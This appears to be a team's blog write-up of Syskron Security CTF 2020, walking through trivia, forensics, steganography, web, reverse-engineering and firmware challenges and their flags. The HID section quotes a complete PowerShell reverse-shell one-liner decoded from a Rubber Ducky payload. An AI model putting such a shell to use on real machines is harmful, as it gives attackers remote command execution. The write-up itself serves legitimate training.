---
layout: post
title: Syskron Security CTF 2020 Solutions-EN
date: '2020-10-27 16:00:00 +0300'
categories: cozumler
---
Hello, we participated as a team in [Syskron Security CTF 2020](https://ctftime.org/event/1148) held between October 21-26. 
We finished the competition with 3420 points as 23rd.

[ctftime page](https://ctftime.org/event/1148)

Below you can find the questions we solved in the competition.

[AUCC](https://twitter.com/_aucc) [@EbubekirTurker](https://twitter.com/EbubekirTurker)


# Welcome 
**(20) Welcome ~reading**  
**Challenge:** [pdf file]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Welcome/welcome-letter.pdf)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Welcome/welcome_1.png)

When we open and read the pdf file given to us, we find the flag.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Welcome/welcome_2.png)

Flag : `syskronCTF{th4nk-you}` 
  
  
# Check Digit 
**(25) # Trivia ~standard**  
**Challenge:** 
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/check-digit_1.png)

If you search for the *IEC standard imei check digit* query on Google, you will see [Luhn Algorithm](https://en.wikipedia.org/wiki/Luhn_algorithm).

Here is the ISO standard we are asked about.

Flag : `syskronCTF{ISO/IEC-7812}`



# Deadly Malware 
**(25) # Trivia ~malware**  
**Challenge:** 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/deadly-malware_1.png)

If we search for *malware that caused deaths due to explosion* on Google , the site [top-5-most-dangerous-industrial-cyberattacks](https://www.stormshield.com/news/top-5-most-dangerous-industrial-cyberattacks/) appears.


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/deadly-malware_2.png)

Of the malwares here, *triton* is the most appropriate .

Flag : `syskronCTF{triton}`


# Security framework 
**(25) # Trivia ~framework ~standard**  
**Challenge:** 
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/security-framework_1.png)

If we read the [pdf file](https://www.nist.gov/system/files/documents/cyberframework/cybersecurity-framework-021214.pdf) 
when we search for nist securty framework 1.1 on Google, we can find 5 core functions and their abbreviations from the table on page 21 .


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/security-framework_2.png)

Flag : `syskronCTF{ID-PR-DE-RS-RC}`

# Vulnerable RTOS 
**(25) # Trivia ~vulnerability**  
**Challenge:** 
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/vulnerable-rtos_1.png)

Searching for *11 zero-day vulnerabilities* on Google, we find our flag in the first search.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Trivia/vulnerable-rtos_2.png)

Flag : `syskronCTF{URGENT/11}`


# DoS attack 
**(100) # Monday ~packet-analysis**  
**Challenge:** [pcap dosyası]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/dos-attack.pcap)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/dos-attack_1.png)

We bought one hint for this question. Hint was  *They bought some older SIPROTEC 4 protection relays*

If we searched on *Google for SIPROTEC 4 DoS attack malware* , we would find [this wikipedia page](https://en.wikipedia.org/wiki/Industroyer).

Flag : `syskronCTF{Industroyer}`

# Redacted news 
**(100) # Monday ~forensics**  
**Challenge:** [attachment image]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/2020-10-1-secureline.png)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/redacted-news_1.png)

There was a censored area in the picture attached to the question.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/redacted-news_2.png)

The flag appeared when we opened the image with [stegsolve.jar](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) and played with the color channels.


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/redacted-news_3.png)

Flag : `syskronCTF{d0-Y0u-UNdEr5TaND-C2eCh?}`

# Security headers 
**(100) # Monday ~web**  
**Challenge:** [website- http://www.senork.de](http://www.senork.de)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/security-header_1.png)

When we opened the Network section in the Developer Tools in Chrome and went to [the site given](http://www.senork.de)  in the question ,
we saw that the flag was in the response header.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Monday/security-header_2.png)

Flag : `syskronCTF{y0u-f0und-a-header-flag}`


# Bash history 
**(200) # Tuesday ~forensics**  
**Challenge:** [bash history]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/bash_history)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/bash-history_1.png)

When we opened and looked at the given file, we saw that most commands are normal, while some contain hashes encoded with base64.

We have decoded all the hashes using the [this CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)) .

Two of them caught our attention. The first was *ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNU* . Because we've decode *echo c3lza3jvbknurnt0sgv5* was coming, 
If we  decode *c3lza3jvbknurnt0sgv5* again the first part of the flag was coming out , which is *syskronctf{they*.

The second was *xYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ==* . 
We were pretty sure that it was base64 because of the ending equals signs, but it was not decoded in any way.

Since we found the first part of the flag , we wondered if *xYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ==* 
is the continuation of *ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNU* and added the this two end to end.

~~~ 
ZWNobyBjM2x6YTNKdmJrTlVSbnQwU0dWNUxYTjBNR3hsTFdGc2JDMUVZWFJoSVNGOQ==
~~~ 

If we decode the hash we got,
~~~
echo c3lza3JvbkNURnt0SGV5LXN0MGxlLWFsbC1EYXRhISF9
~~~ 
was coming out. When we decoded the resulting hash again, we found the flag.

[final recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=YzNsemEzSnZia05VUm50MFNHVjVMWE4wTUd4bExXRnNiQzFFWVhSaElTRjk)

Flag : `syskronCTF{tHey-st0le-all-Data!!}`

# Change 
**(200) # Tuesday ~forensics**  
**Challenge:** [change.jpg]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/change.jpg)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/change_1.png)

We looked at the iamge given to us with the following command in *exiftool*.
~~~bash
	exiftool change.jpg
~~~

The *copyright* section in the results had the [this javascript code](https://pastebin.com/NfsipwNE) .

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/change_2.png)

We found the flag by running this code on the Console screen in Chrome Developer Options.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/change_3.png)

Flag : `syskronCTF{l00k5l1k30bfu5c473dj5}`

# Leak audit 
**(200) # Tuesday ~sql**  
**Challenge:** [Attachment File]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/BB-inDu57rY-P0W3R-L34k3r2.tar.gz)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/leak-audit_1.png)

We opened the .db extension file given to us with the [DB Browser](https://sqlitebrowser.org)  program.

We made the following queries for each option in the question

1) `How many employee records are in the file?`
~~~ sql
	 select count(*) from personal
~~~
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/leak-audit_2.png)


2) `Are there any employees that use the same password? (If true, send us the password for further investigation.)`
~~~ sql
 	SELECT *, COUNT(*) FROM personal GROUP BY password HAVING COUNT(*) > 1
~~~

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/leak-audit_3.png)


3)`In 2017, we switched to bcrypt to securely store the passwords. How many records are protected with bcrypt?`
~~~ sql
	select count(*) from personal where password REGEXP '^\$2[ayb]\$.{56}$'
~~~

We got the bcrypt regex from [stackoverflow sorusundan](https://stackoverflow.com/questions/31417387/regular-expression-to-find-bcrypt-hash) .

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/leak-audit_4.png)

Flag : `376_mah6geiVoo_21`


# Security.txt 
**(200) # Tuesday ~best-practices**  
**Challenge:** 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/security-txt_1.png)

The sites given to us were [https://tools.ietf.org/html/draft-foudil-securitytxt-10](https://tools.ietf.org/html/draft-foudil-securitytxt-10) 
and [https://www.senork.de/.well-known/security.txt](https://www.senork.de/.well-known/security.txt) 
If you cannot access the second site,[ the txt file is here ]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/security.txt)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/security-txt_2.png)

We run the following command to see the details of the [public key](https://www.senork.de/openpgp.asc) in gpg. 
If the link above is broken, you can reach the [public key here]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/openpgp.asc)

~~~bash
	gpg openpgp.asc
~~~

Flag was here.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Tuesday/security-txt_3.png)

Flag : `syskronCTF{Wh0-put3-flag3-1nto-0penPGP-key3???}`


# HID 
**(300) # Wednesday ~binary-analysis**  
**Challenge:**  [inject.bin]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/inject.bin)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/hid_1.png)

We thought this was related to usb rubberducky. That's why we decode the binary file given on the [ducktoolkit](https://ducktoolkit.com/decode#)
site with the German keyboard layout.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/hid_2.png)

The result was a [pastebin linki ](https://pastebin.com/raw/ZRD8jsvd). 
This link would be wrong if you did not do it with the German keyboard layout.


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/hid_3.png)

Flag was on the pastebin link.
~~~
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10syskronCTF{y0u_f0und_m3}",80);$stream = $client.GetStream();[byte[)$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
~~~

Flag : `syskronCTF{y0u_f0und_m3}`


# Key generator 
**(300) # Wednesday ~reverse-engineering**  
**Challenge:** [keygen]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/keygen)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_1.png)

The file given to us was a 64 bit ELF file.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_2.png)

It worked like the picture below, it requested input from us and created a key for us.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/Key generator.png)

We opened it with ghidra to examine it, it was checked whether the input entered in the `genserial` function is `0x6c61736b612121`.
Whereas the `octal` function was called.


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_3.png)

We converted `0x6c61736b612121` to ascii in [this cyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NmMKNjEKNzMKNmIKNjEKMjEKMjE) 
and `laska!!` was the hidden input . 
Then we keygen with this input.


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_5.png)

It gave us a lengthy output instead of generating code.
~~~
1639171916391539162915791569103912491069173967911091119123955915191639156967955916396391439125916296395591439609104911191169719175
~~~


If we look at the `octal` function in the ghidra, the data in `DAT_00102060` was copied to the `local_218` variable.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_6.png)

The second while below was suppressing every 4th character of `local_218`.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_7.png)


209/5000
Since the function name is `octal`, we thought this output should be `octal` and the 9s here are delimeter. 
Because there is no 9 in octal format. Also, the ascii of the first 3 numbers were giving s, y, s.


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_9.png)

We wrote a python script that covers all these.

~~~ python
arr="163917191639153916291579156910391249106917396791109111912395591519163915696795591639639143912591629639559143960910491119116
9719175"

for i in arr.split('9'):
	print(chr(int(i,8)),end="")
print()
~~~ 
![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/key-generator_10.png)

Our flag is out.

Flag : `syskronCTF{7HIS-isn7-s3cUr3-c0DIN9}`

# Screenshot 
**(300) # Wednesday ~image-analysis**  
**Challenge:** [Screenshot_2020-05-19_at_11.38.08_AM.png]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/Screenshot_2020-05-19_at_11.38.08_AM.png)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_1.png)

From the statement `even if it's not that significant`, we understand that the problem is related to LSB (Least Significant Bit).

If we open the picture with `stegsolve.jar` and look around the channels we see the following message in `Red plane 1`.
A second proof that the problem is related to LSB.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_2.png)

We also see two messages in `Green plane 0`, the first one is at the bottom right

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_3.png)

the second is in the top middle. Since the second is vertical, it gives us the impression that there is a column-oriented LSB..

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_4.png)

In the `stegsolve` application, we extract the data with the following options in the extract section. `Green plane 0` , `LSB`, `Column`

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_5.png)

When we search for the 's' character in the [output file]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/Screenshot_output.txt) 
we find the flag.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Wednesday/screenshot_6.png)

Flag : `syskronCTF{s3cr3T_m3sS4g3}`
 
# Contact card 
**(400) # Thursday ~malware**  
**Challenge:** [confidential.zip]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/confidential.zip)
`pass`: `edeb142`


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_6.png)


After some research, we thought this question was related to [the article here](ttps://www.hackingarticles.in/exploiting-windows-pc-using-malicious-contact-vcf-file/).
And we searched for `http.\\` in `.contact` files with the help of vsCode.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_2.png)

It was used in `Maximilian Baecker.contact` and opened `www.random4.cpl` in the `http` folder.
The `www.random4.cpl` file was a 32-bit windows executable.


![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_3.png)

If we clicked there in the specified contact file, a popup would appear and it would direct us to [pastebin link](https://pastebin.com/raw/xSAvEyND).

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_4.png)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/contact-card_5.png)

Flag : `syskronCTF{n3v3r_c11ck_unkn0wn_11nk5}`

# Exposed webcam 
**(400) # Thursday ~webcam**  
**Challenge:** 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_1.png)

There was a camera on the [given site](https://www.senork.de/camtest/front/cam1)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_2.png)

When we reboot the camera following the path `configration->maintenance->reboot`.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_3.png)

directing us to the [error page](https://www.senork.de/camtest/front/cam1/setup/bvKPRB9QvHR6v64HoJqfzbRrZpwQD9.html .

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_4.png)

Error code on this site was
~~~
Li4vYmFja3VwXzIwMjAvMjAyMC0xMC0yMC1yb290LXJlc3RvcmUuYmFja3Vw
~~~ 

We have decoded this in the [this cyberChef recipe ](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=TGk0dlltRmphM1Z3WHpJd01qQXZNakF5TUMweE1DMHlNQzF5YjI5MExYSmxjM1J2Y21VdVltRmphM1Z3). 
The result was `../backup_2020/2020-10-20-root-restore.backup`

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_5.png)

The result was look like a file path. So we downloaded backup file from [this link](https://www.senork.de/camtest/front/cam1/backup_2020/2020-10-20-root-restore.backup) 
This file was originally an encrypted zip file.
If the link above is broken, you can download it [here]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/2020-10-20-root-restore.backup).

We started the password search. We found the password of `testuser` on `View parameters` page.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_6.png) 

It was `mmDi54YChNNYNMQM9y9PH48uKVcMQX`. But this was not backup's password.

Secondly, there was a password cencored with * on the security page. We revealed it with inspecting element and this was the password of the backup file.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Thursday/exposed-webcam_7.png)

When we extracted the backup file with the password `dYzqmTkKv457BENsKBGSfD5vcudrXe`, 
`testuser.backup` came out. The resulting file was an encrypted zip file, thankfully we found its password before, which was `dYzqmTkKv457BENsKBGSfD5vcudrXe`.

From that too, "testuser.backup" came out and at the end it was a normal file with a flag in it.

Flag : `syskronCTF{why-1s-th1s-file-here?}`



# Firmware update 
**(500) # Friday ~reverse-engineering ~crypto**  
**Challenge:** [LibrePLC_firmware_pack.zip]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/LibrePLC_firmware_pack.zip)

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_1.png)

Note: `5157CA3SDGF463249FBF`

3 encrypted zip files came out of the given zip file.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_2.png)

The flag of the first was given in the Note part of the question, which was `5157CA3SDGF463249FBF`.

We opened the first file, there were 2 files. `key` was a python script and expected us to run it with an argument.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_3.png)

When we run it with the following command
~~~ bash
python3 LibrePLC_fw_1.0.0/key LibrePLC_fw_1.0.0/LibrePLC_fw_1.0.0.bin 
~~~ 
it was printing following output.
~~~
7SYSCC3076BDCTF13CC9CTFA6CB7SYSCC3076CD56579549EC5AB533EN03AFC1F9N
~~~ 
This was the password for the second zip file.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_4.png)

There was a file in the second file and we used the command we ran before.
And it produced following output.
~~~
CSYS0BBA60E46ABB19C5BC0CSYS0CCK60EQ1NC41E2C5DDA4C5C7D45E096162
~~~

It was the password for the 3.zip file.

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_5.png)

When he extracted the last zip file, he gave us a file similar to the previous ones. 
When we opened it with the Hex editor, the flag was at the top.


~~~ bash
head -n 2  ./LibrePLC_fw_1.0.2/LibrePLC_fw_1.0.2.bin| xxd
~~~ 

![]({{ AUCyberClub.github.io }}/assets/img/syskronctf/Friday/firmware-update_6.png)

Flag : `syskronCTF{s3Cur3_uPd4T3}`
